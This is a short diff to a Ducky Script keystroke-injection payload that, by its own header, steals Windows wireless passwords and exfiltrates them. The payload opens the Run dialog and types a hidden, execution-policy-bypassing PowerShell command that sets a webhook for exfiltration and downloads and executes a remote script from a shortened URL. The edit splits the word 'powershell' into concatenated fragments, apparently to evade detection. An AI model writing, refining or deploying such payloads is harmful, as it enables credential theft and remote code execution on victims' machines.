@@ -2,5 +2,5 @@ REM Ducky Script (Bruce) for Stealing Windows Wireless Passwords and exfiltratin
 DELAY 500
 GUI r
 DELAY 300
-STRING powershell -w h -ep bypass $discord='https://example.com/webhook'; irm https://tinyurl.com/ckadlov-win-wifi1 | iex
+STRING po'wer' + 'sh' + 'ell' -w h -ep bypass $discord='https://example.com/webhook'; irm https://tinyurl.com/ckadlov-win-wifi1 | iex
 ENTER
